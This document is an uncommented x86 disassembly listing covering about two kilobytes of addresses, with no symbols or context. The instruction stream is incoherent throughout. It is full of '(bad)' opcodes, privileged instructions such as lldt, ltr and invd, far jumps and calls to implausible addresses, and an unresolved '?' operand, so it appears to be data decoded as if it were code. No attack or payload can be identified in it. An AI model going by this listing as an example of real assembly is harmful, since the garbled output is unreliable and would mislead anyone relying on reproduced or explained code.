  42b1d3:	mov    ecx,DWORD PTR [ebx+0x489408]
  42b1d9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  42b1df:	push   ecx
  42b1e0:	jo     0x42b1ca
  42b1e2:	inc    DWORD PTR [edi]
  42b1e4:	or     BYTE PTR [eax],al
  42b1e6:	call   0xcdb930
  42b1eb:	fmul   QWORD PTR [ebp+0x55]
  42b1ee:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  42b1f4:	mov    bh,0x8c
  42b1f6:	adc    al,0x9e
  42b1f8:	dec    esp
  42b1f9:	xor    bl,BYTE PTR [eax]
  42b1fb:	mov    ecx,DWORD PTR [ebp+0xc]
  42b1fe:	mov    eax,DWORD PTR [ebp-0x4]
  42b201:	mov    esi,DWORD PTR [edi-0x3148f924]
  42b207:	push   es
  42b208:	retf   
  42b209:	mov    BYTE PTR [ebp-0x30],0x3b
  42b20d:	inc    ebp
  42b20e:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  42b215:	retf   0x83fc
  42b218:	into   
  42b219:	dec    ebp
  42b21a:	retf   
  42b21b:	mov    ecx,DWORD PTR [ebp-0x74]
  42b21e:	mov    eax,DWORD PTR [eax]
  42b220:	fdiv   QWORD PTR [ebx]
  42b222:	mov    bh,0x3
  42b224:	push   es
  42b225:	mov    esi,ecx
  42b227:	sbb    cl,dl
  42b229:	dec    ebp
  42b22a:	sar    DWORD PTR [ebx],cl
  42b22c:	push   ebp
  42b22d:	jne    0x42b23e
  42b22f:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  42b235:	lea    ebx,[eax]
  42b237:	call   0xf4cc3dfe
  42b23c:	sbb    dh,dl
  42b23e:	add    edx,ebx
  42b240:	push   ebp
  42b241:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  42b247:	push   ecx
  42b248:	mov    DWORD PTR [eax-0x30],edx
  42b24b:	test   DWORD PTR [edx],eax
  42b24d:	xadd   esp,esi
  42b250:	pop    es
  42b251:	add    cl,dl
  42b253:	mov    eax,ecx
  42b255:	or     al,0x45
  42b257:	(bad)  
  42b258:	push   eax
  42b259:	add    DWORD PTR [edx+0x0],eax
  42b25c:	add    ecx,DWORD PTR [ecx]
  42b25e:	and    dh,cl
  42b260:	call   0xc6bb30
  42b265:	add    DWORD PTR [ebp+0x0],edx
  42b268:	mov    esp,DWORD PTR [ebp+0x18]
  42b26b:	add    BYTE PTR [eax+0x24],cl
  42b26e:	xor    eax,DWORD PTR [eax]
  42b270:	add    esp,DWORD PTR [esi+0x3b]
  42b273:	inc    ebp
  42b274:	je     0x42b1f9
  42b276:	push   ecx
  42b277:	or     cl,BYTE PTR [ebp-0x77]
  42b27a:	add    eax,esi
  42b27c:	or     al,0x1e
  42b27e:	inc    eax
  42b27f:	add    BYTE PTR [ebx],al
  42b281:	data16 and BYTE PTR [ebp+0x50],al
  42b285:	sub    DWORD PTR [ecx],0x8
  42b288:	add    BYTE PTR [ebp-0x75],ah
  42b28b:	add    BYTE PTR [eax],bl
  42b28d:	enter  0x894d,0x8b
  42b291:	int3   
  42b292:	loopne 0x42b24e
  42b294:	rol    BYTE PTR [eax],0x33
  42b297:	lea    cx,[ebp+0xa]
  42b29b:	data16 jb 0x42b2e3
  42b29e:	add    BYTE PTR [ebx+0x44890855],cl
  42b2a4:	sbb    ah,al
  42b2a6:	inc    ebp
  42b2a7:	inc    edx
  42b2a8:	lldt   WORD PTR [edx+0x66]
  42b2ac:	xor    ecx,DWORD PTR [eax]
  42b2ae:	sub    ecx,DWORD PTR [eax]
  42b2b0:	mov    eax,DWORD PTR [eax]
  42b2b2:	or     al,0x66
  42b2b4:	ror    edx,cl
  42b2b6:	dec    ebp
  42b2b7:	inc    ebp
  42b2b8:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  42b2be:	cld    
  42b2bf:	or     BYTE PTR [edi+0x4501dd],dl
  42b2c5:	enter  0xeece,0xcb
  42b2c9:	(bad)  
  42b2ca:	dec    ebp
  42b2cb:	mov    al,0x8b
  42b2cd:	jmp    0xea27:0x450a3320
  42b2d4:	xchg   esi,ebp
  42b2d6:	add    edi,eax
  42b2d8:	add    BYTE PTR [eax+0x3f52ed55],bh
  42b2de:	push   ebp
  42b2df:	inc    ebp
  42b2e0:	xor    edx,eax
  42b2e2:	add    ebp,esi
  42b2e4:	push   edx
  42b2e5:	push   bp
  42b2e7:	inc    ebp
  42b2e8:	jmp    ecx
  42b2ea:	push   esp
  42b2eb:	(bad)  
  42b2ec:	inc    edx
  42b2ee:	sbb    al,0x33
  42b2f0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  42b2f7:	add    BYTE PTR [ebp+0x49],0x8b
  42b2fb:	jmp    0xf98b:0x100041c8
  42b302:	xor    esi,DWORD PTR [edx+0x3]
  42b305:	mov    ecx,DWORD PTR [edi]
  42b307:	fmul   DWORD PTR [edx]
  42b309:	add    BYTE PTR [eax],al
  42b30b:	lea    eax,[ebx-0x4700273c]
  42b311:	add    al,0x4f
  42b313:	pop    DWORD PTR [eax]
  42b315:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  42b31b:	push   edx
  42b31c:	inc    WORD PTR [ebp+0x8]
  42b320:	mov    eax,0x514f4d
  42b325:	(bad)
  42b329:	add    al,al
  42b32b:	xor    DWORD PTR [ebx-0x74baf730],eax
  42b331:	test   DWORD PTR [esi+0x74],esp
  42b334:	inc    ebp
  42b335:	mov    DWORD PTR [eax+0xa4e08],edi
  42b33b:	add    BYTE PTR [ecx-0x76c435bb],cl
  42b341:	or     dh,cl
  42b343:	or     eax,0x8b8d5045
  42b348:	inc    ebp
  42b349:	mov    WORD PTR [ecx+0x3b8a00],?
  42b34f:	jne    0x42b384
  42b351:	mov    edi,DWORD PTR [edx+0x8f3b18]
  42b357:	add    DWORD PTR [ebx],eax
  42b359:	add    bh,bh
  42b35b:	adc    DWORD PTR [eax],ecx
  42b35d:	adc    DWORD PTR [ebp+0x55],edi
  42b360:	push   es
  42b361:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  42b367:	mov    ebp,DWORD PTR [eax+ebp*1+0x503211d0]
  42b36e:	inc    ebp
  42b36f:	mov    edx,edi
  42b371:	or     al,0xd0
  42b373:	push   eax
  42b374:	(bad)  
  42b375:	jne    0x42b32b
  42b377:	call   0x2aac5c
  42b37c:	inc    ebp
  42b37d:	shl    BYTE PTR [edx],0x84
  42b380:	out    dx,al
  42b381:	add    bh,al
  42b383:	add    BYTE PTR [ebp+esi*2-0x2c7430],bh
  42b38a:	(bad)  
  42b38b:	and    al,al
  42b38d:	fs loope 0x42b38f
  42b390:	inc    ebp
  42b391:	test   DWORD PTR [edi+ecx*1-0x37],edi
  42b395:	scas   al,BYTE PTR es:[edi]
  42b396:	inc    esp
  42b397:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  42b39e:	or     BYTE PTR [ebx-0x97717cb],0x83
  42b3a5:	call   DWORD PTR [edi]
  42b3a7:	shr    ah,0x84
  42b3aa:	xchg   DWORD PTR [eax],eax
  42b3ac:	add    DWORD PTR [eax],eax
  42b3ae:	add    bh,bh
  42b3b0:	dec    ebp
  42b3b1:	and    BYTE PTR [ecx-0x38],dl
  42b3b4:	push   eax
  42b3b5:	dec    DWORD PTR [ebx+0xfd885]
  42b3bb:	mov    BYTE PTR [ebp+0x508bac00],cl
  42b3c1:	mov    WORD PTR [ecx+0x0],ss
  42b3c4:	lea    ecx,[ebx+0x108b20d8]
  42b3ca:	mov    WORD PTR [edx],ds
  42b3cc:	add    BYTE PTR [edi+0xff01ff],al
  42b3d2:	mov    ecx,DWORD PTR [ebp-0x28]
  42b3d5:	push   ecx
  42b3d6:	shl    BYTE PTR [ebp+0x3a],0x8b
  42b3da:	inc    ebp
  42b3db:	in     al,0xeb
  42b3dd:	jno    0x42b36a
  42b3df:	push   edx
  42b3e0:	mov    DWORD PTR [eax-0x28],edx
  42b3e3:	mov    eax,DWORD PTR [ebp+0x20]
  42b3e6:	je     0x42b36f
  42b3e8:	mov    eax,DWORD PTR [ecx]
  42b3ea:	sbb    BYTE PTR [eax],al
  42b3ec:	pop    DWORD PTR [eax]
  42b3ee:	add    esi,eax
  42b3f0:	add    bl,al
  42b3f2:	adc    DWORD PTR [edi],esi
  42b3f4:	jmp    0x8bce0446
  42b3f9:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  42b400:	jne    0x42b38d
  42b402:	mov    ecx,DWORD PTR [eax]
  42b404:	in     al,0x75
  42b406:	pop    DWORD PTR [ecx+0x5701]
  42b40c:	push   edx
  42b40d:	inc    DWORD PTR [ebx]
  42b40f:	adc    BYTE PTR [ecx+0x45721cc6],cl
  42b415:	add    BYTE PTR [edi+0x9],dl
  42b418:	call   DWORD PTR [esi]
  42b41a:	and    dl,al
  42b41c:	and    bh,bh
  42b41e:	inc    edi
  42b420:	test   eax,edx
  42b422:	sldt   ebx
  42b425:	xor    al,0x0
  42b427:	pushf  
  42b428:	(bad)  
  42b429:	jmp    0x42b437
  42b42b:	mov    eax,edi
  42b42d:	or     al,0x75
  42b42f:	inc    eax
  42b430:	call   0x42ab38
  42b435:	mov    eax,eax
  42b437:	loopne 0x42b3bd
  42b439:	inc    ebp
  42b43a:	add    BYTE PTR [ebx+0x1451c00],cl
  42b440:	mov    eax,DWORD PTR [ebp+0x20]
  42b443:	add    edi,ecx
  42b445:	add    BYTE PTR [eax],ch
  42b447:	cmp    edi,0x18
  42b44a:	test   DWORD PTR [ebp+0xf],esi
  42b44d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  42b454:	jne    0x42b458
  42b456:	call   0xffa1af1b
  42b45b:	leave  
  42b45c:	rcr    BYTE PTR [esp+eax*4],0x55
  42b460:	add    ah,ch
  42b462:	add    BYTE PTR [edi-0x48fef979],dh
  42b468:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  42b46f:	inc    esp
  42b470:	mov    ebx,DWORD PTR [eax]
  42b472:	fcom   st(2)
  42b474:	add    BYTE PTR [edi],bl
  42b476:	lea    ecx,[eax-0x18]
  42b479:	(bad)  
  42b47a:	push   DWORD PTR [ecx]
  42b47c:	call   0xffb501de
  42b481:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  42b485:	fstp   DWORD PTR [esi+ebx*8]
  42b488:	push   ebp
  42b489:	pop    ebp
  42b48a:	mov    esi,DWORD PTR [edx-0x38]
  42b48d:	add    DWORD PTR [eax],0x28
  42b490:	mov    edi,DWORD PTR [ebx]
  42b492:	xor    esi,DWORD PTR [edx+0x3]
  42b495:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  42b499:	pop    ebp
  42b49a:	or     al,0x4
  42b49c:	inc    ecx
  42b49d:	push   ebp
  42b49e:	(bad)  
  42b49f:	in     al,dx
  42b4a0:	or     ah,ch
  42b4a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b4a3:	xbegin 0xffc82a99
  42b4a9:	clc    
  42b4aa:	adc    al,0x45
  42b4ac:	div    BYTE PTR [eax+ecx*1]
  42b4af:	pushf  
  42b4b0:	add    bh,al
  42b4b2:	jne    0x42b48c
  42b4b4:	add    DWORD PTR [ebp+0x1b00f89e],0x66710066
  42b4be:	add    eax,DWORD PTR [ebp+0x52]
  42b4c1:	adc    eax,0x60
  42b4c4:	xchg   DWORD PTR [ecx+0x3000fc01],ecx
  42b4ca:	test   DWORD PTR [eax],eax
  42b4cc:	clc    
  42b4cd:	data16 or al,BYTE PTR [ebp+0x45]
  42b4d1:	or     DWORD PTR [ebx-0x3d76d720],0xfffffff8
  42b4d8:	rol    BYTE PTR [ebp+0x45],1
  42b4db:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  42b4e1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  42b4e7:	push   ebx
  42b4e8:	add    BYTE PTR [edi+0x0],dl
  42b4eb:	push   ecx
  42b4ec:	jge    0x42b521
  42b4ee:	add    BYTE PTR [esi+0x4],dl
  42b4f1:	jne    0x42b558
  42b4f3:	mov    edx,0x457200
  42b4f8:	jmp    0x42b4bc
  42b4fa:	xor    edi,DWORD PTR [ebx]
  42b4fc:	pop    edi
  42b4fd:	cvtdq2ps xmm7,xmm0
  42b500:	ret    0x0
  42b503:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  42b509:	xor    ecx,DWORD PTR [edi]
  42b50b:	add    eax,DWORD PTR [ecx+0x3b]
  42b50e:	push   ebx
  42b50f:	rdpmc  
  42b511:	out    0x8d,al
  42b513:	add    BYTE PTR [eax],cl
  42b515:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  42b51b:	ret    0x450c
  42b51e:	sbb    al,0x8b
  42b520:	cmp    eax,esi
  42b522:	or     cl,al
  42b524:	or     al,0xc2
  42b526:	pop    eax
  42b527:	inc    ebp
  42b528:	add    ecx,DWORD PTR [edi]
  42b52a:	add    esi,DWORD PTR [ebp+0x39]
  42b52d:	invd   
  42b52f:	jge    0x42b53b
  42b531:	mov    eax,0x478ac0
  42b536:	cli    
  42b537:	xor    esp,ecx
  42b539:	mov    ebx,0x5b8ac0
  42b53e:	ret    0x33
  42b541:	mov    eax,0x833b8b
  42b546:	sub    BYTE PTR [ebx],al
  42b548:	inc    ebp
  42b549:	xor    ax,0x9cf8
  42b54d:	inc    bh
  42b54f:	mov    esp,esp
  42b551:	hlt    
  42b552:	test   DWORD PTR [ebp-0x8],esi
  42b555:	mov    eax,DWORD PTR [ebp-0x14]
  42b558:	xor    ecx,DWORD PTR [ebx-0x76478864]
  42b55e:	dec    edi
  42b55f:	or     BYTE PTR [eax],al
  42b561:	jne    0x42b4ec
  42b563:	mov    esi,esp
  42b565:	call   0x77a9412a
  42b56a:	inc    ebp
  42b56b:	mov    DWORD PTR [eax+0x9e4f0c],edi
  42b571:	add    BYTE PTR [ecx-0x3ffe0717],cl
  42b577:	add    BYTE PTR [esi+0x7d],ah
  42b57a:	inc    ebp
  42b57b:	mov    bx,WORD PTR [ebp+0x8]
  42b57f:	add    DWORD PTR [ebp+0x57],0x30c008b
  42b586:	inc    ebp
  42b587:	mov    bx,di
  42b58a:	lock test BYTE PTR [ecx+0x7000801],bh
  42b591:	jge    0x42b554
  42b593:	mov    ecx,DWORD PTR [ebx-0x610613f0]
  42b599:	cli    
  42b59a:	xor    bl,bh
  42b59c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  42b5a2:	test   BYTE PTR [eax],cl
  42b5a4:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  42b5ab:	cmp    ebp,eax
  42b5ad:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  42b5b4:	test   BYTE PTR [ebp+0x1],bh
  42b5b7:	mov    ebx,0x458a00
  42b5bc:	xor    esi,DWORD PTR [ebx]
  42b5be:	add    esp,DWORD PTR [esi-0x77]
  42b5c1:	pop    ebp
  42b5c2:	loopne 0x42b62a
  42b5c4:	inc    ebp
  42b5c5:	clc    
  42b5c6:	xor    edi,DWORD PTR [ebx]
  42b5c8:	add    esi,DWORD PTR [edx-0x77]
  42b5cb:	data16 fdivr QWORD PTR [ebp-0x49]
  42b5cf:	mov    ebx,0xb78afc
  42b5d4:	hlt    
  42b5d5:	xor    eax,DWORD PTR [edx+0x66]
  42b5d8:	add    BYTE PTR [ebp+0x66],bl
  42b5db:	data16 lock clc 
  42b5de:	inc    edx
  42b5df:	cmp    eax,DWORD PTR [eax]
  42b5e1:	ja     0x42b649
  42b5e3:	psubq  mm7,QWORD PTR [ebp+0x8]
  42b5e7:	ltr    WORD PTR [ebp+0x66]
  42b5eb:	add    esi,eax
  42b5ed:	add    di,WORD PTR [ebp+0x2b]
  42b5f1:	data16 data16 jge 0x42b672
  42b5f5:	mov    ebx,0xe08a8b
  42b5fa:	jge    0x42b62f
  42b5fc:	data16 data16 xor al,0x5d
  42b600:	data16 data16 jne 0x42b5fc
  42b604:	mov    edi,DWORD PTR [ebx]
  42b606:	fdiv   QWORD PTR [edx+0x7d]
  42b609:	data16 data16 jge 0x42b641
  42b60d:	mov    ebx,0x758a66
  42b612:	mov    esi,0x667233
  42b617:	pop    ebp
  42b618:	or     BYTE PTR [esi+0x0],ah
  42b61b:	clc    
  42b61c:	mov    edi,DWORD PTR [ebx]
  42b61e:	lock ja 0x42b5ac
  42b621:	(bad)  
  42b623:	jge    0x42b61c
  42b625:	invd   
  42b627:	pop    ebp
  42b628:	add    BYTE PTR [ebx],al
  42b62a:	(bad)  
  42b62b:	cmp    di,WORD PTR [ebp+0xf]
  42b62f:	data16 sbb bh,BYTE PTR [ebp+0x0]
  42b633:	mov    bx,WORD PTR [ebp-0x10]
  42b637:	pop    bp
  42b639:	fbstp  TBYTE PTR [ebx]
  42b63b:	test   DWORD PTR [ebx],eax
  42b63d:	add    BYTE PTR [ebx],bh
  42b63f:	add    BYTE PTR [esi+0x7d],ah
  42b642:	jge    0x42b5cf
  42b644:	data16 in al,dx
  42b646:	pop    ebp
  42b647:	stc    
  42b648:	bsf    ecx,DWORD PTR [ebp+0x6632009e]
  42b64f:	mov    edi,ebx
  42b651:	in     al,dx
  42b652:	test   BYTE PTR [ebp+0x0],bh
  42b655:	mov    eax,DWORD PTR [eax]
  42b657:	call   0xbd3fafe7
  42b65c:	inc    edx
  42b65d:	sahf   
  42b65e:	add    BYTE PTR [edx],dh
  42b660:	mov    bx,di
  42b663:	call   0x8b4b33f3
  42b668:	add    ebp,esp
  42b66a:	mov    bx,di
  42b66d:	jnp    0x42b695
  42b66f:	mov    DWORD PTR [ebx+0x427df808],ecx
  42b675:	mov    eax,DWORD PTR [eax]
  42b677:	call   0x7c3e41e2
  42b67c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  42b682:	data16 data16 fistp WORD PTR [ebp+0xe]
  42b687:	xor    DWORD PTR [edi-0x48fff7a9],0xfb66f403
  42b691:	fisttp WORD PTR [ecx-0x7401f77b]
  42b697:	(bad)  
  42b698:	cld    
  42b699:	jne    0x42b6dd
  42b69b:	xor    eax,DWORD PTR [eax]
  42b69d:	mov    esp,DWORD PTR [esi-0x10]
  42b6a0:	sti    
  42b6a1:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  42b6a8:	data16 adc bl,bh
  42b6ab:	push   ebp
  42b6ac:	xor    ecx,DWORD PTR es:[ebx+0x42e4f88b]
  42b6b3:	mov    WORD PTR [eax],es
  42b6b5:	sahf   
  42b6b6:	data16 xor bh,bl
  42b6b9:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  42b6bf:	mov    esp,DWORD PTR [esi-0x14]
  42b6c2:	fisttp WORD PTR [ebx-0x3748a9f2]
  42b6c8:	or     al,0x2b
  42b6ca:	mov    bh,0xba
  42b6cc:	hlt    
  42b6cd:	mov    bh,bl
  42b6cf:	add    BYTE PTR [ecx-0x7446f3cd],cl
  42b6d5:	dec    esi
  42b6d6:	or     al,0x0
  42b6d8:	mov    edi,DWORD PTR [ebx]
  42b6da:	or     BYTE PTR [ebp+0x3b],dh
  42b6dd:	mov    ecx,DWORD PTR [edi]
  42b6df:	fdivr  QWORD PTR [ebx-0x7499ff83]
  42b6e5:	xor    al,0xd8
  42b6e7:	pop    bp
  42b6e9:	lock xor esi,DWORD PTR [ebx]
  42b6ec:	lea    esp,[esi+0x1f]
  42b6ef:	icebp  
  42b6f0:	jb     0x42b6f6
  42b6f2:	add    al,al
  42b6f4:	jge    0x42b702
  42b6f6:	mov    eax,eax
  42b6f8:	fsubr  st,st(3)
  42b6fa:	pop    ebp
  42b6fb:	mov    esi,DWORD PTR [ebx]
  42b6fd:	in     al,0x8d
  42b6ff:	rcr    DWORD PTR [edi],0xc2
  42b702:	jb     0x42b762
  42b704:	add    cl,cl
  42b706:	jge    0x42b714
  42b708:	mov    edx,DWORD PTR [ebp-0x20]
  42b70b:	in     al,dx
  42b70c:	pop    ebp
  42b70d:	data16 data16 or BYTE PTR [esi+edi*4],bh
  42b712:	cmp    di,WORD PTR [ebp+0x0]
  42b716:	mov    ebp,DWORD PTR [ebx]
  42b718:	fdivr  QWORD PTR [esi+0x668a5d]
  42b71e:	cmp    al,0x33
  42b720:	mov    si,0x4e7d
  42b724:	mov    eax,DWORD PTR [eax]
  42b726:	lock inc ebp
  42b728:	mov    esi,DWORD PTR [esi]
  42b72a:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  42b731:	clc    
  42b732:	(bad)  
  42b733:	cmp    edi,DWORD PTR [ebx]
  42b735:	je     0x42b746
  42b737:	push   ebx
  42b738:	loopne 0x42b749
  42b73a:	dec    ecx
  42b73c:	mov    esp,DWORD PTR [edx-0x1c]
  42b73f:	int    0xf1
  42b741:	mov    esi,0x703084d
  42b746:	movlhps xmm6,xmm1
  42b749:	add    BYTE PTR [ebp+0x66],dh
  42b74c:	jmp    0x42b719
  42b74e:	mov    eax,DWORD PTR [ebx]
  42b750:	lock push ebp
  42b752:	ror    DWORD PTR [ebp-0x2972feb3],1
  42b758:	or     bh,dl
  42b75a:	jb     0x42b75a
  42b75c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  42b762:	loopne 0x42b764
  42b764:	jne    0x42b76e
  42b766:	data16 add BYTE PTR [esi+eiz*2],dh
  42b76a:	mov    ecx,ebx
  42b76c:	inc    dx
  42b76e:	icebp  
  42b76f:	add    BYTE PTR [edx+0x66],al
  42b772:	add    bl,cl
  42b774:	mov    dx,0xf2
  42b778:	mov    edx,0x66cb0066
  42b77d:	enter  0x4df1,0x19
  42b781:	pop    edi
  42b782:	jne    0x42b705
  42b784:	mov    esi,DWORD PTR [esi]
  42b786:	call   0x77b74327
  42b78b:	xor    ebp,DWORD PTR [ebx]
  42b78d:	lea    esp,[esi+0x48]
  42b790:	repnz in eax,0x3b
  42b793:	add    BYTE PTR [ebp-0x37],dh
  42b796:	xor    edx,DWORD PTR [ebp-0x15]
  42b799:	in     al,dx
  42b79a:	xor    edx,DWORD PTR [esi+0x40]
  42b79d:	mov    DWORD PTR [edi],0x338545fc
  42b7a3:	clc    
  42b7a4:	add    esi,DWORD PTR ds:0xe85b9c5f
  42b7aa:	ret    0xff
  42b7ad:	dec    DWORD PTR [ebx-0x74f8ae08]
  42b7b3:	xor    eax,0x7c084956
  42b7b8:	add    BYTE PTR [ecx+0x66],ah
  42b7bb:	(bad)  
  42b7bc:	into   
  42b7bd:	bound  eax,QWORD PTR [edx-0x33]
  42b7c0:	add    BYTE PTR [ecx+0x7ce0866],bh
  42b7c6:	mov    edx,0xc7000066
  42b7cb:	or     ah,bh
  42b7cd:	add    BYTE PTR [ebp+0x35c3f866],al
  42b7d3:	inc    edx
  42b7d4:	pushf  
  42b7d5:	add    BYTE PTR [esi+0x66],ah
  42b7d8:	into   
  42b7d9:	ret    
  42b7da:	pop    ebp
  42b7db:	fs push edi
  42b7dd:	add    BYTE PTR [edi-0x723c409a],dh
  42b7e3:	add    edi,edi
  42b7e5:	jne    0x42b83e
  42b7e7:	lea    edx,[ecx+0x1]
  42b7ea:	mov    ebx,0xd64ff1
  42b7ef:	sar    DWORD PTR [ebx],1
  42b7f1:	test   BYTE PTR [ebp+0x3c],dh
  42b7f4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  42b7f8:	push   edi
  42b7f9:	xor    BYTE PTR [ebx],0x35
  42b7fc:	mov    esi,ebx
  42b7fe:	xor    eax,DWORD PTR [eax-0x3c73839a]
  42b804:	cmp    al,0x45
  42b806:	fs pop ebx
  42b808:	mov    ebx,0x9c3b36
  42b80d:	je     0x42b83a
  42b80f:	xor    edi,DWORD PTR [ebx+0x668a33]
  42b815:	mov    WORD PTR [ebx],?
  42b817:	cmp    al,0xbb
  42b819:	fs dec esi
  42b81b:	mov    eax,DWORD PTR [eax]
  42b81d:	pop    edi
  42b81e:	cmp    ecx,ecx
  42b820:	jne    0x42b877
  42b822:	mov    ebp,esp
  42b824:	cld    
  42b825:	push   esi
  42b826:	pop    ebx
  42b827:	inc    ebp
  42b828:	stc    
  42b829:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  42b831:	clc    
  42b832:	test   dl,dl
  42b834:	notrack jmp DWORD PTR [esi+eiz*2+0x5e]
  42b839:	or     bl,al
  42b83b:	or     BYTE PTR [ebx+0x57665100],cl
  42b841:	retf   0x4245
  42b844:	add    BYTE PTR ss:[esi+eiz*2-0x457a3542],bl
  42b84c:	clc    
  42b84d:	add    BYTE PTR [ebx+0x66],bl
  42b850:	dec    edx
  42b852:	mov    edx,DWORD PTR [edi-0x76]
  42b855:	push   edi
  42b856:	add    al,0xb7
  42b858:	xor    al,0xba
  42b85a:	cmp    al,0x8d
  42b85c:	je     0x42b85d
  42b85e:	mov    edx,DWORD PTR [edi-0x46]
  42b861:	push   ecx
  42b862:	lea    edi,[ebx+0x574fff]
  42b868:	push   ecx
  42b869:	cmp    edx,DWORD PTR [ebx+0x75]
  42b86c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  42b872:	add    BYTE PTR [ebx],dh
  42b874:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  42b87a:	add    BYTE PTR [ebx+esi*1+0x4f64bb3c],cl
  42b881:	mov    ebx,0x3b3b00
  42b886:	jne    0x42b8b3
  42b888:	mov    DWORD PTR [ebx+0x728afc],edi
  42b88e:	xor    esi,DWORD PTR [ebx]
  42b890:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  42b896:	push   edi
  42b897:	cmp    esp,ebp
  42b899:	jne    0x42b89b
  42b89b:	sbb    DWORD PTR [eax],0x8085c3fc
  42b8a1:	clc    
  42b8a2:	dec    ecx
  42b8a3:	pop    ebx
  42b8a4:	sti    
  42b8a5:	add    eax,0xeb8bc075
  42b8aa:	cld    
  42b8ab:	xor    edi,DWORD PTR ds:0xf8c3855e
  42b8b1:	mov    ecx,DWORD PTR [ecx+edx*2]
  42b8b4:	rol    DWORD PTR [ebp-0x37],0xf
  42b8b8:	mov    DWORD PTR [eax],ecx
  42b8ba:	inc    edi
  42b8bb:	(bad)  
  42b8bc:	in     eax,0xf8
  42b8be:	add    bh,bh
  42b8c0:	(bad)  
  42b8c1:	mov    esi,0xc38a5e
  42b8c6:	mov    esi,DWORD PTR [ebx]
  42b8c8:	push   ecx
  42b8c9:	mov    edi,0xfc4ec7
  42b8ce:	test   DWORD PTR [ebp-0x8],edx
  42b8d1:	xor    ax,0x9cc7
  42b8d5:	sub    ebp,eax
  42b8d7:	inc    ebp
  42b8d8:	(bad)  
  42b8d9:	sub    edi,edi
  42b8db:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  42b8e1:	inc    ebp
  42b8e2:	add    BYTE PTR [esi+0x2b],ah
  42b8e5:	or     bh,BYTE PTR [edx+0xf8ac2]
  42b8eb:	cmp    al,0x33
  42b8ed:	mov    edi,DWORD PTR [edx+0xf84e81]
  42b8f3:	(bad)  
  42b8f4:	cmp    esi,DWORD PTR [ebx]
  42b8f6:	je     0x42b8b0
  42b8f8:	push   ebx
  42b8f9:	dec    esi
  42b8fa:	str    ecx
  42b8fd:	cmp    esp,DWORD PTR [edx+0x75]
  42b900:	int    0x33
  42b902:	mov    edi,0x789085f
  42b907:	mov    esp,DWORD PTR [esp+edi*8+0x0]
  42b90b:	leave  
  42b90c:	data16 add al,0xcb
  42b90f:	push   ebp
  42b910:	add    ebp,esp
  42b912:	jne    0x42b900
  42b914:	(bad)  
  42b915:	mov    DWORD PTR [ecx],0xd685f7ec
  42b91b:	clc    
  42b91c:	xlat   BYTE PTR ds:[ebx]
  42b91d:	inc    ebp
  42b91e:	mov    esi,DWORD PTR [eax+edx*2]
  42b921:	pushf  
  42b922:	in     eax,0x8b
  42b924:	add    ah,ch
  42b926:	or     BYTE PTR [edi+0x0],dl
  42b929:	push   ecx
  42b92a:	add    ax,0x72cb
  42b92e:	inc    edx
  42b92f:	add    BYTE PTR [eax],al
  42b931:	inc    ebp
  42b932:	data16 (bad) 
  42b934:	retf   
  42b935:	lock mov edx,0x66f80085
  42b93b:	inc    ebp
  42b93c:	retf   
  42b93d:	xor    eax,ecx
  42b93f:	pushf  
  42b940:	jge    0x42b909
  42b942:	ss cld 
  42b944:	pushf  
  42b945:	test   DWORD PTR [edi-0x8],ebx
  42b948:	je     0x42b98f
  42b94a:	xor    esi,DWORD PTR ds:0x7020840
  42b950:	ror    BYTE PTR [ebp-0x37],0x8d
  42b954:	push   ebp
  42b955:	add    esp,ebp
  42b957:	jb     0x42b8e4
  42b959:	add    BYTE PTR [eax],cl
  42b95b:	dec    ebp
  42b95c:	mov    bh,0x81
  42b95e:	push   esi
  42b95f:	push   edi
  42b960:	adc    DWORD PTR [ecx-0x3c],0x429eff81
  42b967:	xor    al,BYTE PTR [eax]
  42b969:	mov    edx,DWORD PTR [edi+0x10]
  42b96c:	(bad)  
  42b96d:	scas   eax,DWORD PTR es:[edi]
  42b96e:	mov    edx,0x890f003b
  42b973:	in     eax,dx
  42b974:	cld    
  42b975:	add    BYTE PTR [ebx],bh
  42b977:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  42b97b:	dec    ebp
  42b97c:	or     BYTE PTR [ebx],ch
  42b97e:	ret    0x458b
  42b981:	lock jmp 0x42b975
  42b984:	mov    ecx,DWORD PTR [eax]
  42b986:	or     BYTE PTR [edi],al
  42b988:	mov    ecx,eax
  42b98a:	xor    DWORD PTR [edx+0x2],0x0
  42b98e:	mov    bh,0xc1
  42b990:	adc    BYTE PTR [eax],dh
  42b992:	iret   
  42b993:	inc    ebp
  42b994:	mov    DWORD PTR [ebx],0x4dfff8c4
  42b99a:	inc    BYTE PTR [ebx]
  42b99c:	mov    edx,0x661100f8
  42b9a1:	adc    al,bh
  42b9a3:	dec    ecx
  42b9a4:	fisttp WORD PTR [ecx+0x456604c0]
